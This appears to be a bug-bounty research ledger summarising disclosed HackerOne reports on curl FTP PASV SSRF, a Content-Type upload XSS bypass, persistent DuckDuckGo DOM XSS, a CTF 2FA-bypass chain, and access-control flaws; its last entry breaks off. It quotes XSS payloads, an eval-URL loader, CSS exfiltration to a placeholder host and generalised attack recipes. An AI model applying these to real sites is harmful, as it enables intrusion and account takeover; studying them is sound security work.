SOURCE: https://hackerone.com/reports/1040166  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1040166.json` — HTTP 200, `visibility: full`, VI 2,379 B read IN FULL. Metadata: curl, "CVE-2020-8284: trusting FTP PASV responses", reporter `vepe`, created 2020-11-21, disclosed 2021-02-09, severity low, weakness Information Disclosure.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no SSRF target exercised, no FTP server stood up)
CLASS: SSRF escalation to internal network port scan + service banner disclosure (XSPA) — FTP PASV data-channel redirection (CVE-2020-8284: `CURLOPT_FTP_SKIP_PASV_IP` disabled by default)
CORE METHOD:
  1. PRECONDITION (report, verbatim): "an attacker controlling the URL used by curl" — a URL-fetch SSRF where the fetcher is curl/libcurl and `ftp://` is accepted. "One good target for this issue are web applications vulnerable to SSRF."
  2. THE REDIRECTION (report, verbatim): "setting up a custom FTP server that would setup the data channel through the PASV command using the port scanning target IP and port in the PASV connection info" — the report ships the harness (attachment F1088885): `./ssrf_pasvaggresvftp.sh -t 127.0.0.1/31 -p 80,8000-8100 -x ./ftp_curl.sh -vv`. The defect (report, verbatim): "curl by default has the option CURLOPT_FTP_SKIP_PASV_IP disabled by default" — curl TRUSTS the IP:port in the attacker's PASV reply and opens the data channel there.
  3. THE ORACLE (report, verbatim — three-way classification from the FTP control channel after PASV): OPEN = "curl will reply with TYPE after the PASV command" (`Received: TYPE I in 6ms`); FILTERED = "curl will timeout after the PASV command" (` in 1011ms`); CLOSED = "curl will close the control channel connection immediately after PASV" (` in 5ms`).
  4. THE BANNER GRAB (report, verbatim): "an attacker points curl at host:22 for the data channel. If an ssh server is running on that host, then it will reply with its version which is then disclosed to the attacker."
  5. THE TERMINAL (report, verbatim): "an attacker could uncover services running in the internal network. It could also be possible to perform version enumeration ... this issue can be used as a stepping stone to launch further attacks on the vulnerable server."
DETECTION SIGNAL: a URL-fetch SSRF where the caller controls the scheme (`url=`, `src=`, `callback=`, `feed=`); the tell that FTP is live is your FTP server receiving `USER anonymous` / `PASV` (or `EPSV`) from the victim's curl — then the PASV reply is yours to aim anywhere the SERVER can reach.
CHAIN: SSRF fetch of `ftp://<attacker-server>` (primitive: attacker-controlled URL to a curl-based fetcher) -> the attacker's PASV reply points the DATA channel at `internal-ip:port` (escalation: raw TCP connect from the server to ANY host/port the server can reach — not limited to HTTP) -> control-channel oracle classifies every internal port open/filtered/closed + data-channel banner grab (e.g. SSH version on :22) (terminal: internal network map + service/version enumeration as the stepping stone; the report's own ceiling — pair with a service-level exploit for RCE). Per doctrine §8: precondition = a curl-based URL-fetch SSRF accepting ftp:// + a server routable to the internal net; gain = internal port map + service banners (§1 SSRF with internal reach / XSPA).
TRANSFERABLE TEST: on any curl-based URL fetch, point `url=` at your own FTP server that answers PASV with `(internal_ip, internal_port)` (a pyftpdlib subclass overriding `PASV`/`EPSV` to return the scan target — or the report's `ssrf_pasvaggresvftp.sh`); classify ports by what curl does next (TYPE I = open; ~1s hang = filtered; instant control-channel close = closed); aim at 22/6379/11211/9200/3306/5432 and read first-line banners from the data channel. Rule: **a protocol whose server responses steer the client's next connection (FTP PASV/EPSV) turns a URL-fetch SSRF into a raw internal TCP connect — scan and banner-grab through the data channel even when the fetch response body is empty.**
DEDUPE/DELTA: tokens `1040166`, `vepe`, `PASV`, `FTP_SKIP_PASV_IP`, `ssrf_pasvaggresv` = 0 hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: the XSPA/SSRF-port-scan corpus (ledger ~304 mtail localhost scan via response oracle; ~321 the XSPA naming; ~3357 URL-preview `og:title` read-oracle + port scan; ~4491 TURN relay arbitrary-protocol connect; ~4688 GraphQL-argument fetch + blind port scan) owns the CLASS — every recorded instance is an HTTP/response-oracle carrier; §17.190/#1912778 (curl FTP connection-pool reuse key) is a DIFFERENT curl-FTP defect (identity confusion, not connection steering). DELTA here: the FTP-PASV DATA-CHANNEL REDIRECTION mechanism — the attacker's own server steers the victim curl's TCP connect at arbitrary internal IP:port, with a 3-way timing/status oracle and protocol-banner read. Per the batch-165/#1551176/#1851818/#1066189 precedent (a carrier/mechanism-variant of an owned class gets a ledger entry and NO §17 slot), NO §17 slot.
FRESHNESS: created 2020-11-21, disclosed 2021-02-09 — OUTSIDE the preferred window (~5.8 years; CVE-2020-8284 fixed in curl 7.74.0, Dec 2020). Read because assigned; version-bounded (fixed curl), but the class recovers wherever an SSRF fetcher bundles an old libcurl or speaks another protocol with server-steered connections.
HONESTY: not reproduced (knowledge intake only; no SSRF target exercised). Every quote above is verbatim from the live `.json` body read IN FULL this pass.

SOURCE: https://hackerone.com/reports/1019425  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1019425.json` — HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (server-withheld by design). The method is from the report page's H1 DISCLOSURE SUMMARY: the og:description meta fetched live from the page (H1-truncated at "This allowed an attacker to...") + the full summary text as indexed from the same report page via `web_search` (verbatim continuation: "This allowed an attacker to upload a HTML file with `text/html` as the effective `Content-Type`, allowing for a page with arbitrary JavaScript embedded to be loaded on a victim's browser. This resulted in a stored XSS on BOOTH's sandboxed domain s2.booth.pm."). Ladder run: Wayback captures (20210108184551 / 20221104233155 / 20230929214456) = same summary / JS shell; HF parquet mirror row = 0 B; `r.jina.ai` = 401. No credited writeup exists. Metadata: pixiv, "Bypass extension check leads to stored XSS at https://s2.booth.pm", reporter `fanar`, created 2020-10-26, disclosed 2021-01-08, severity medium 5.7, weakness XSS - Stored.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; pixiv not touched)
CLASS: stored XSS via file upload — Content-Type VALIDATION CONFUSION (a compound/multi-token MIME value carries both the dangerous type and an allowed token; the check passes, the effective type is the dangerous one)
CORE METHOD:
  1. SURFACE (summary, verbatim): "a stored XSS in the header image upload function at https://manage.booth.pm/design/edit" — the BOOTH shop header-image upload (same upload family as the recorded ImageTragick entry #402362: `PATCH /design`, `Host: manage.booth.pm`, field `shop[header]`).
  2. THE FLAWED CHECK (summary, verbatim): "the server failed to properly validate the provided `Content-Type`" — the upload validates the CLIENT-SUPPLIED Content-Type header.
  3. THE BYPASS (summary, verbatim): "accepting unintended values such as `Content-Type: text/html; image/png` where `text/html` should not be included" — one request header carrying BOTH tokens: the validator accepts the compound value, the effective Content-Type is `text/html`.
  4. THE PAYLOAD (summary, verbatim): "This allowed an attacker to upload a HTML file with `text/html` as the effective `Content-Type`, allowing for a page with arbitrary JavaScript embedded to be loaded on a victim's browser."
  5. THE TERMINAL (summary, verbatim): "This resulted in a stored XSS on BOOTH's sandboxed domain s2.booth.pm" — the stored object is served from the sandboxed file domain and renders as HTML there.
DETECTION SIGNAL: an upload whose validation reads the REQUEST's Content-Type header (not byte sniffing) and rejects some types; test compound/invalid values (`text/html; image/png`, `image/png, text/html`, `text/html; charset=utf-8; image/png`) — the tell is an upload ACCEPTED when the value contains an allowed token alongside a dangerous one, and a stored object whose SERVED Content-Type/rendering is the dangerous type.
CHAIN: attacker with a shop/creator account uploads a header image with `Content-Type: text/html; image/png` (primitive: MIME-check confusion — the compound value passes) -> an HTML file with arbitrary JS is accepted and stored -> served from s2.booth.pm -> any victim who loads the attacker's shop/asset URL executes the JS in the s2.booth.pm origin (terminal: stored XSS on the sandboxed file domain). Per doctrine §8: precondition = a creator account able to set one shop's header image + one victim visit to the stored object; gain = arbitrary JS on the s2.booth.pm origin (report severity medium 5.7 — the SANDBOXED domain bounds the cookie scope; no claim beyond the report).
TRANSFERABLE TEST: on every upload that validates Content-Type: send an HTML/SVG body with `Content-Type: text/html; image/png` (also `image/png; text/html`, `text/html; charset=utf-8`), then GET the stored object and check (a) the served Content-Type header and (b) whether the browser executes the embedded JS (and whether `X-Content-Type-Options: nosniff` / `Content-Disposition: attachment` are absent); if the compound value passed the check and the object renders active, the MIME validator is confused. Rule: **a MIME check that accepts a value merely CONTAINING an allowed token can be passed with a compound Content-Type (`text/html; image/png`) — the file uploads "as an image" and renders as HTML; always diff the SERVED type, never trust the upload's request header.**
DEDUPE/DELTA: tokens `1019425`, `fanar`, `s2.booth`, `text/html; image` = 0 hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: §1.4 "Upload/parser-based stored XSS (media handling)" (TikTok #2306491/#1504202 — owns the CLASS "upload feature as HTML renderer; check the SERVED Content-Type, not the upload response; `.html` smuggled past extension checks"); #402362 (SAME product, SAME upload surface — manage.booth.pm `shop[header]` — but server-side ImageTragick RCE via the image PROCESSOR, a different defect); #78158 (IBB — a `?lang=`/`?encoding=` parameter appended to the RESPONSE's Content-Type -> Flash injection — response-side manipulation, not upload-side validation confusion); #452559 (Vimeo — Content-Type-keyed storage AUTH gate on PUT); the generic "set Content-Type to image/png to pass the check" spoof (single allowed value; the DELTA here is the COMPOUND value satisfying a token-matching validator while keeping text/html as the effective type). Per the batch-165/#1551176/#1851818/#1066189 precedent (mechanism-variant of an owned class -> ledger entry, NO §17 slot), NO §17 slot.
FRESHNESS: created 2020-10-26, disclosed 2021-01-08 — OUTSIDE the preferred window (~5.9 years). Read because assigned; the validator-confusion shape recurs wherever an upload checks the request header instead of the bytes.
HONESTY: not reproduced (knowledge intake only; pixiv not touched). The researcher body is server-withheld (`visibility: no-content`, VI 0 B — confirmed in the live `.json`, the Wayback shells and the HF mirror row); the method above is quoted from the H1 DISCLOSURE SUMMARY on the public report page (og:description fetched live + the same page's indexed text), which names the endpoint, the exact bypass header value and the terminal; the summary's truncation point is stated; nothing beyond it (raw request, extension-check interplay, exact parser behavior) is claimed.

SOURCE: https://hackerone.com/reports/921635  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/921635.json` — HTTP 200, `visibility: full`, VI 2,574 B read IN FULL. Metadata: DuckDuckGo, "DOM XSS on duckduckgo.com search", reporter `sijisu`, created 2020-07-12, disclosed 2020-08-20, severity medium, weakness XSS - DOM.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; duckduckgo.com not touched, no `POST /settings.js` sent to the real service)
CLASS: persistent (stored) DOM XSS — an attacker-written SETTINGS-SYNC ("Cloud Save") blob bound to the victim by a URL parameter and persisted in localStorage; plus a per-value length-limit bypass via a URL-eval loader
CORE METHOD:
  1. THE WRITE (report, verbatim): `POST /settings.js HTTP/1.1` / `Host: duckduckgo.com` with body `{"command":"write","objectKey":"bb6e45...03ff","obj":{"kp":"\"><img src=/ onerror=alert(1)>","kae":"\"><img src=/ onerror=alert(2)>"}}` — "we need to create malicious \"Cloud Save\" setting with our XSS payloads, an attacker would do that on their computer". The `kp`/`kae` settings values carry the breakout payload.
  2. THE BIND (report, verbatim): the victim opens `https://duckduckgo.com/?q=a&key=<objectKey>` — "The Cloud Save key is now saved in the browser's Local Storage."
  3. THE PERSISTENCE (report, verbatim): "Because the settings are downloaded from Cloud Save on every visit of the results page, our code will be executed every time as well. Try searching https://duckduckgo.com/?q=a, it even triggers on the settings page https://duckduckgo.com/settings and others." — ONE victim visit = permanent XSS on the duckduckgo.com origin.
  4. THE SINK: the `kp`/`kae` values render unescaped into the results-page DOM (`">` breaks out of the attribute context).
  5. THE LENGTH-LIMIT BYPASS (report, verbatim): "You cannot have Cloud Save settings property longer than 30 characters. However, there are many tricks on how to bypass this limitation. For example one of many great @terjanq 's payloads does the trick here. It evals the URL so you can make your payload long enough to execute malicious code." — store `"><svg/onload=eval(`'`+URL)>` and deliver the code in the victim URL's fragment: `https://duckduckgo.com/?q=s&key=<key>#';alert(document.domain);` — `eval("'"+URL)` parses the URL as JS: the `'` prefix plus the fragment's `';` close a string literal, the remainder executes as code.
DETECTION SIGNAL: any settings/import/sync/config-share feature with (a) a WRITE of a settings blob (unauthenticated or self-service: `command=write`, `PUT /settings`, `POST /profile/import`) and (b) a URL parameter (`key=`, `config=`, `settings=`, `profile=`, `import=`) that binds the client to a stored blob persisted in localStorage/IndexedDB; oracle = after one visit with the parameter, does an injected value fire on later visits WITHOUT the parameter?
CHAIN: attacker writes a malicious Cloud Save blob (primitive: self-service `POST /settings.js` `command=write` under an attacker-chosen `objectKey`) -> victim clicks one `?key=<attacker-key>` link (precondition: one click; the key persists in localStorage) -> `kp`/`kae` values render unescaped into the results page (primitive: DOM XSS) -> arbitrary JS fires on EVERY subsequent search/settings visit (terminal: persistent DOM XSS on duckduckgo.com — reads the origin's localStorage incl. the victim's own Cloud Save key/settings and acts as the victim on the origin; report's own impact, verbatim: "Attacker can execute JavaScript", severity medium — recorded as rated, no inflation). Per doctrine §8: precondition = one victim click; gain = permanent arbitrary JS in the duckduckgo.com origin.
TRANSFERABLE TEST: on every settings-import/cloud-sync/config-share surface: (1) write an attacker-owned settings blob through the documented write API; (2) bind a test client with the URL parameter; (3) put an HTML/attribute breakout in EVERY stored value; (4) reload WITHOUT the parameter — if the payload still fires, it is PERSISTENT stored XSS (not one-shot reflected); (5) if values are length-capped, store a short loader (`"><svg/onload=eval(`'`+URL)>`, `eval(name)`, `eval(location.hash.slice(1))`) and deliver the real code in the URL fragment/tab name. Rule: **an attacker-written settings blob bound by a URL parameter is a stored-XSS persistence carrier — one click makes the payload fire on every visit; per-value length caps are beaten by a loader that evals the URL.**
DEDUPE/DELTA: tokens `921635`, `sijisu`, `cloud save`, `settings.js`, `objectKey`, `kp=`, `kae`, `terjanq`, `eval(`'`+URL)` = 0 technique hits across the three write targets immediately before append (regex hits on `settings.py`/`settings.json` inside probe wordlists and `objectKey` in a Shopify GraphQL dedupe note are NOT this technique). Related-but-distinct REVIEWED and NOT conflated: batch-110's #876148 (DuckDuckGo `relsexp` — a ONE-SHOT reflected DOM XSS explicitly declined as chain-only "no sanitizer bypass, no chain"; THIS is persistent/stored with a documented countermeasure bypass); #3619287 (DuckDuckGo `pull_request_target` RCE — different surface); the Jamf `configUrl=data:` entry (ledger ~2993 — a config URL that CHANGES APP BEHAVIOR to render a phishing page, not an unescaped settings render + localStorage persistence); generic "XSS -> localStorage theft" entries (they exfiltrate storage AFTER XSS; here localStorage is the PERSISTENCE CARRIER for the XSS itself). DELTA: the sync-blob write + URL-key binding + localStorage persistence carrier + the eval-URL length-limit loader. New general method -> §17.767.
FRESHNESS: created 2020-07-12, disclosed 2020-08-20 — OUTSIDE the preferred window (~6.2 years). Read because assigned; the settings-import/sync carrier recurs in every app with config-import/share features.
HONESTY: not reproduced (knowledge intake only; duckduckgo.com not touched). Every quote above is verbatim from the live `.json` body read IN FULL this pass.

SOURCE: https://hackerone.com/reports/889886  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/889886.json` — HTTP 200, `visibility: full`, VI 14,187 B read IN FULL (FIRST route worked). Metadata: h1-ctf, "[H1-2006 2020] Connecting the dots to send hackers their Bug Bounty", reporter `akshansh`, created 2020-06-03, disclosed 2020-06-18, severity critical, weakness Code Injection (H1's label; the body is an 8-stage chain — see CLASS).
STATUS: UNVERIFIED (not reproduced — knowledge intake only; the bountypay CTF environment no longer exists)
CLASS: account-takeover / privilege-escalation chain — exposed-log credential leak -> deterministic-2FA bypass (challenge = md5(answer), BOTH request-supplied) -> JWT-claim path-traversal SSRF through the app's own whitelisted open redirect -> internal APK + deep-link/logcat token leak -> method-confusion credential disclosure -> forced admin upgrade via report-fetch + `template[]` composition + `#tab` trigger -> repeated 2FA bypass -> CSS exfiltration of hidden challenge inputs
CORE METHOD:
  1. LEAK (recon): certspotter on `*.bountypay.h1ctf.com` -> dirsearch finds `/.git/config` on the app host -> the repo's commit page -> `bp_web_trace.log` -> `https://app.bountypay.h1ctf.com/p_web_trace.log` = base64-encoded request logs carrying `{"username":"brian.oliver","password":"V7h0inzX",...,"challenge_answer":"bD83Jk27dQ"}` (credentials + the 2FA answer).
  2. 2FA BYPASS (the core bypass): the hidden `challenge` field is `md5(challenge_answer)` — verbatim: "the challeneg was an md5 hash so upon thinking i tried making an md5(bD83Jk27dQ) that was from earlier logs so the hash came out as `5828c689761cce705a1c84d9b1a1ed5e`" -> body `username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ` "successfully bypassed the 2fa". Second formulation (stage 7, NO leaked answer needed): "take challenge from hidden input field calling it as A and md5(A) and the resulting hash B that you will get it would now become the challenge and so your request be something like `challenge=B&challenge_answer=A` which bypasses 2fa" — with BOTH params request-supplied the server only checks `md5(challenge_answer) == challenge`.
  3. CLAIM-TRAVERSAL SSRF: the session cookie is a JWT `{"account_id":"Ae8iJLkn9z","hash":"3616d6b2c15e50c0248b2276b484ddb2"}` — verbatim: "the account_id was not being checked with the hash so we can inject our values and it would be accepted". The API has a whitelist-filtered open redirect (`/redirect?url=`) and `software.bountypay.h1ctf.com` is IP-allowlisted ("it also only allowed urls incoming request via specific ips"). Inject `{"account_id":"./../../../../redirect?url=https://software.bountypay.h1ctf.com/?","hash":"3616d6b2c15e50c0248b2276b484ddb2"}` — verbatim: "which would traverse backwards in api directory and since its a virualhost this would work in system there locally making a request to software subdomain" — the trusted API server fetches the IP-restricted vhost through its own whitelisted redirect; brute the path in the cookie value (`.../uploads?` reveals the APK listing) and pull `https://software.bountypay.h1ctf.com/BountyPay.apk`.
  4. TOKEN LEAK: decompile the APK; manifest deep links skip the activity checks (`adb shell am start -d one://part?start=PartTwoActivity`, `"two://part?two=light\&switch=on"`, `"three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"`); `adb logcat` then leaks `HOST IS: : http://api.bountypay.h1ctf.com` / `TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1` / `HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1`.
  5. METHOD-CONFUSION CREDENTIAL DISCLOSURE: `GET /api/staff/` + `X-Token: 8e9998ee3137ca9ade8f372739f062c1` lists staff (`STF:` ids); a company tweet leaks Sandra's badge id `STF:8FJ3KFISL3`; `GET` cannot fetch it but the POST responds `["Missing Parameter"]` — revealing the parameter name — and `POST staff_id=STF:8FJ3KFISL3` returns `{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}`: the POST both creates AND returns credentials for a guessed staff id.
  6. FORCED ADMIN UPGRADE: `https://staff.bountypay.h1ctf.com/js/website.js` holds `upgradeToAdmin` (admin-gated) and `sendReport` (callable by sandra; "it would make the #tab1 triggers element class tab1"); set the avatar to `tab1 upgradeToAdmin` and submit `https://staff.bountypay.h1ctf.com/?template[]=ticket&ticket_id=358&template[]=home&username=sandra.allison#tab1` through sendReport — `template[]` composes TWO templates so the username input AND the tab1 element share one DOM, and `#tab1` auto-triggers the handler: "when we submit this report would trigger automatically tab1 then it would call upgrade for sandra and she would become the admin" -> the admin tab exposes `marten.mickos` credentials.
  7. CSS EXFIL OF HIDDEN VALUES (terminal): the payment 2FA "was making a request to a stylesheet so sending any else url the server would make a request to it" (server-side stylesheet fetch injecting attacker CSS into the page); the challenge sits in hidden inputs whose names are unknown — fuzz them with `input[name^=c] ~ * { background-image: url(<OAST>/c); }` -> names `code_1..code_6` (7th differs) -> per-name value exfil `input[name^=code_1][value^=A] ~ * { background-image: url(https://<OAST>/code1/A); }` over A-Z,a-z,0-9, 7th char by intruder response length (2163) -> the flag.
DETECTION SIGNAL: (a) a 2FA/challenge form where BOTH `challenge` and the answer travel in the request and the challenge is a hash of the answer; (b) a signed/cookie token whose claim is used as a PATH component in a backend fetch without re-binding to the signature/hash; (c) an admin-gated action function next to a report/URL-fetch function in the same JS bundle plus a hash-fragment-triggered handler.
CHAIN: leaked logs (credential + 2FA answer) -> self-computed md5 pair passes the second factor (auth bypass with zero server-secret knowledge) -> unbound JWT claim path traversal steers the API's own fetch through its whitelisted open redirect to the IP-allowlisted internal host (SSRF past an IP ACL) -> internal APK + deep-link/logcat -> `X-Token` -> method-confusion POST mints staff credentials for a badge id seen in a tweet -> `sendReport` + `template[]` + `#tab1` fires `upgradeToAdmin` for the attacker (forced privileged action) -> admin credentials -> repeat the md5-pair 2FA bypass -> server-side stylesheet fetch + CSS attribute-selector exfil reads the hidden payment challenge -> flag (full program takeover; terminal per report: the flag + admin/marten credentials).
TRANSFERABLE TEST: on every custom 2FA / challenge-response form: capture one successful login; then start a fresh login and, at the challenge screen, choose `A` yourself, compute `B = md5(A)` (match the observed transform), and submit BOTH fields in one request (`challenge=B&challenge_answer=A`) taking NOTHING from the page; if the check is only `md5(answer) == challenge` over two caller-supplied values, the second factor is minted client-side and the flow is bypassed without any secret. Rule: **a challenge that is a deterministic function of the answer is no challenge — when the request carries both `challenge` and `challenge_answer`, mint your own consistent pair.**
DEDUPE/DELTA: tokens `889886`, `akshansh`, `bountypay`, `challenge_answer`, `upgradeToAdmin`, `sendReport`, `template[]`, `sandra.allison` = 0 technique hits across the three write targets immediately before append (the single `bounty pay` phrase hit at ledger 19316 is an unrelated PowerApps entry). Related-but-distinct REVIEWED and NOT conflated: the CSS attribute-selector exfil leg is OWNED (§17.228/§17.232/§17.241) and the stylesheet-URL CSS-injection delivery is §17.641 — this entry's CSS rung is only the chain terminal, not a new CSS method; "the target's OWN open redirect as the SSRF pivot/WAF bypass" rung is recorded (ledger 16662/16670; ledger 9800 "ride a whitelisted host's open redirect"; §17.340) — the DELTA here is the CARRIER: an unbound JWT claim used as a PATH COMPONENT with `./../../../../` traversal to REACH that redirect, aimed at an IP-allowlisted internal vhost (the fetch originates from the trusted API server, so the IP ACL passes); batch-301 §17.767 (settings-blob persistence) and §17.765 (multi-placeholder template re-entry) are different mechanisms from `template[]` DOM composition + `#tab` auto-trigger forced action. NEW general method from this source -> §17.768 (the deterministic-2FA-pair bypass).

SOURCE: https://hackerone.com/reports/816143  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/816143.json` — HTTP 200, `visibility: full`, VI 549 B read IN FULL (FIRST route worked). Metadata: HackerOne (own program, asset `hackerone.com`), "A team member of the program with Report rights can ban the Admin", reporter `haxta4ok00`, created 2020-03-10, disclosed 2020-05-15, severity low, weakness Business Logic Errors.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no HackerOne team-management account touched)
CLASS: privilege escalation (vertical) / business logic — TARGET-RANK INVERSION on a moderation action: the ban action authorizes the ACTOR's permission (`Report`) but never the TARGET's rank, so a plain team member can ban the program's ADMIN
CORE METHOD:
  1. PRECONDITION (report, verbatim): "a team member of the program with such permission can ban a member with `Admin` rights" — the actor holds ONLY the `Report` permission: "my group - `one_permission` have permission `Report`".
  2. THE ENTRY POINT (report, verbatim): "1) Admin submit new report in program 2) A team member with Report rights can use the 'Ban reporters ' panel via their report" — the ban UI is reachable through any report, including the admin's own submission; the route is legitimately gated on `Report` and the actor holds it — reaching the panel is NOT the bug.
  3. THE DEFECT: the action checks the actor-side permission but carries no target-side clause (no `target rank <= actor rank`, no role allow-list on the ban target), so the admin — who outranks the actor — is accepted as a ban target.
  4. THE EFFECT (report, verbatim): "After `ban` , admin can't create new report in program (it's not logical)" / Impact (verbatim): "Ban the Admin in program".
DETECTION SIGNAL: any team/collaboration admin surface with moderation actions (ban/suspend/remove/role-change/deactivate) whose authorization is a single actor-permission check; the tell = the action SUCCEEDS against a target holding a HIGHER role than the actor (matrix: actor role x target role).
CHAIN: team member with only `Report` permission (precondition: routine low-privileged team membership, no admin rights, no user interaction) -> open the "Ban reporters" panel through any report -> ban the program ADMIN (primitive: the action never rank-checks the target) -> the admin "can't create new report in program" (terminal: vertical privilege escalation — a lower role exercises admin-level moderation against the admin; an account-state change on a higher-privileged principal; program sabotage / admin lockout). Per doctrine §8: precondition = a low-privileged team member; gain = admin-level moderation over the admin — H1 rated LOW; recorded at its rated weight, no inflation (disruption of the admin's submission right is the demonstrated gain; no data or monetary impact claimed).
TRANSFERABLE TEST: on every team/collaboration admin panel holding moderation actions: (1) enumerate the action routes from UI/JS (`ban`, `suspend`, `remove`, `role`, `deactivate`, `delete`) as the lowest-privileged member; (2) build an actor-role x target-role matrix using two accounts you control plus one in-scope higher-ranked member's public id; (3) fire each action at a target that OUTRANKS the actor; (4) `200` + the action applied to the higher-ranked principal = rank inversion. Rule: **"the actor may ban" is half an authorization decision — matrix-test every moderation action against higher-ranked targets; the missing clause is on the TARGET, not the actor.**
DEDUPE/DELTA: tokens `816143`, `haxta4ok00`-for-this-report (his OTHER reports #807448/#310946 are recorded), `Ban reporters`, `one_permission`, `ban the Admin`, `target rank`/`outrank` = 0 technique hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: V-06 "Vertical privilege escalation via function-level access control evasion" (Bugbountyskills ~1331) owns REACHING a privileged ROUTE from a low-priv session ("the button only shows for admins" — role x endpoint matrix against routes); here the route is LEGITIMATELY reachable (the panel's gate IS `Report`) and the defect is the absent TARGET-side clause (0 corpus hits for a target-rank check); ledger 2876 owns bypassing a reporter BAN via an alternate submission route (ban EVASION, not ban IMPOSITION); ledger 9519 + §17.467 own admin-offboarding/transition-state permission persistence (different lifecycle); Nextcloud #508493 (ledger ~20621) is vertical privesc via reserved-name collision (different mechanism). DELTA: the split authorization — (actor may perform) without (target may be acted upon by this actor). NEW general method -> §17.769.
FRESHNESS: created 2020-03-10, disclosed 2020-05-15 — OUTSIDE the preferred 6-12 month window (~6.6 years) — recorded as BACKFILL, flagged; read because assigned. The rank-inversion shape is version-independent.

SOURCE: https://hackerone.com/reports/818848  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/818848.json` — HTTP 200, `visibility: full`, VI 578 B read IN FULL (FIRST route worked). Metadata: HackerOne (own program, asset `hackerone.com`), "Read-only team members can read all properties of webhooks", reporter `bencode`, created 2020-03-13, disclosed 2020-04-29, severity low, weakness Improper Access Control - Generic.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no HackerOne team account touched)
CLASS: BAC — missing ROLE-GATED FIELD SENSITIVITY on secret-bearing config objects: a read-only team member can read ALL webhook properties including the signing `secret`, via the team GraphQL root
CORE METHOD:
  1. PRECONDITION (report, verbatim): "Have an admin of a program setup webhooks / As a team member (read-only) log in".
  2. THE QUERY (report, verbatim, steps 3-4): "Run the following graphql query:" `{ query { team(handle: "security") { name webhooks { nodes { id secret url } } } } }` -> "See that you get data back".
  3. THE DEFECT (report, verbatim): "A team member can view all properties of webhooks despite not needing them." — the `webhooks.nodes.secret` field is not role-gated: the TEAM object is legitimately reachable for the member, the SECRET field is not.
  4. THE EFFECT (report, verbatim): Impact: "Read only users will be able to identify where webhooks exist and secrets".
DETECTION SIGNAL: an API (GraphQL or REST) exposing integration/webhook/config objects with `secret`/`token`/`signing_key` fields where the caller's role is BELOW the field's sensitivity; the tell = the lowest-privileged role receives the secret material in a normal 200 response while the UI shows those settings only to admins.
CHAIN: read-only team member (precondition: routine low-privileged membership, no user interaction) -> `team(handle:...){webhooks{nodes{id secret url}}}` -> the webhook signing `secret` + target `url` are returned (primitive: secret field not role-gated on a legitimately-reachable object) -> with a signing secret the attacker can MIMIC the platform's own signed webhook deliveries to the program's registered integration endpoints (forged events into the org's downstream Slack/Jira/etc. — the concrete consequence the disclosed secret enables; the report's own stated impact stops at "identify where webhooks exist and secrets", H1 rated LOW — the forge-delivery rung is documented as the consequence of possessing the secret, not demonstrated in the report). Per doctrine §8: precondition = read-only member; gain = signing secrets + URLs of the program's webhooks (sensitive-info disclosure with PoC -> forge-authentic event injection downstream).
TRANSFERABLE TEST: as the LOWEST-privileged role, sweep every nested config/integration object for secret fields — GraphQL: `team(handle:...){webhooks{nodes{id secret url}} apiTokens integrations ... }` (field names from introspection/JS bundle/error suggestions); REST: `GET /webhooks`, `/integrations`, `/settings/*`; then diff against the admin UI: any `secret`/`token`/`private_key` value returned to the low role = field-sensitivity BAC. Rule: **object reachability is not field authorization — a legitimately-visible integration object must still gate its `secret` fields by role; test secret-bearing config as the weakest role.**
DEDUPE/DELTA: tokens `818848`, `bencode`, `team(handle:`+`webhooks`+`secret` = 0 hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: the CLASS (GraphQL field/object-level authorization) is RECORDED — §10.2 (#489146, field-level authz on the `User` type), the #807448 invitation over-exposure entry, ledger 5462 (H1 `node(id:)` private-field read) and ledger 5471's own note ("the CLASS ... is recorded") — so per the batch-165/#1551176/#1851818/#1066189 precedent (mechanism-variant of an owned class -> ledger entry, NO §17 slot), NO §17 slot. DELTA kept as atoms: (a) the OBJECT FAMILY — secret-bearing ADMIN-CONFIG objects (webhooks/integrations) reached through the normal team root, not hidden user fields or cross-tenant node lookups; (b) the ROLE axis — field sensitivity vs the caller's role on a legitimately-reachable object; (c) the terminal the secret enables (forge signed deliveries). Ledger 20426's "webhook-with-signing-secret" entry is an integration CONNECT/TEST SSRF (write-side), not a secret READ by a low role; ledger 18794's `webhookSecret` is a server-config FILE read (different carrier).

SOURCE: https://hackerone.com/reports/767829  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/767829.json` — HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (FIRST route worked). Metadata: Starbucks (`www.starbuckscardb2b.com`), "Account take over of 'light' starbuckscardb2b users", reporter `zude`, created 2020-01-03, disclosed 2020-01-29, severity high.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; starbuckscardb2b.com not touched)
CLASS: authentication bypass / account takeover — the account-creation handler UPSERTS on the email identity key: plain re-registration with an already-registered email silently REWRITES that account's password
CORE METHOD:
  1. Register account with email E and password P1 (report, verbatim: "user successfully created the account with ```abc@xyz.com``` and password ```12345678```").
  2. WITHOUT any verification, confirmation or special parameter, submit the ordinary create-account form AGAIN with the SAME email E and a NEW password P2 (report, verbatim: "Now attacker will create the account with the email used in step 2  ```abc@xyz.com``` with different password.").
  3. The handler writes the record BY EMAIL KEY (upsert) instead of insert-with-unique-check (report, verbatim: "After completion of step 3 the password for the  ```abc@xyz.com``` user will be set to the password used by attacker.").
